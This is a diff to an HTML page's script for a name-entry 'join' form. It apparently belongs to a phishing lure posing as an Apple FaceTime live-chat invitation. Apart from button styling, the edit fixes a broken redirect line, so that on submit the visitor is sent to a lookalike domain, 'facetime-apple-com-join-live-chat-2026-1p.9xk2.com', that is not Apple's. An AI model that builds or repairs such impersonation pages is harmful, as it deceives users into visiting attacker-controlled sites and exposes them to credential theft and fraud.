@@ -685,27 +685,33 @@ body {
   </form>
 </section>
 
+  
 <script>
   const joinForm = document.getElementById("joinForm");
   const displayName = document.getElementById("displayName");
   const joinButton = document.getElementById("joinButton");
-  const formStatus = document.getElementById("formStatus");
 
   displayName.addEventListener("input", function () {
-    joinButton.disabled = displayName.value.trim() === "";
-    formStatus.textContent = "";
+    const hasName = displayName.value.trim() !== "";
+
+    joinButton.disabled = !hasName;
+
+    if (hasName) {
+      joinButton.style.backgroundColor = "#5f6368";
+    } else {
+      joinButton.style.backgroundColor = "";
+    }
   });
 
   joinForm.addEventListener("submit", function (event) {
     event.preventDefault();
 
-    const name = displayName.value.trim();
-
-    if (!name) return;
-    formStatus.textContent = "Your entered name: " + name;
-    window.location.href = "https://facetime-apple-com-join-live-chat-2026-1p.9xk2.com/LM7Q-ZP/6405")});
-  
+    if (displayName.value.trim() !== "") {
+      window.location.href =
+        "https://facetime-apple-com-join-live-chat-2026-1p.9xk2.com/LM7Q-ZP/6405";
+    }
+  });
 </script>
-    
+
 </body>
 </html>
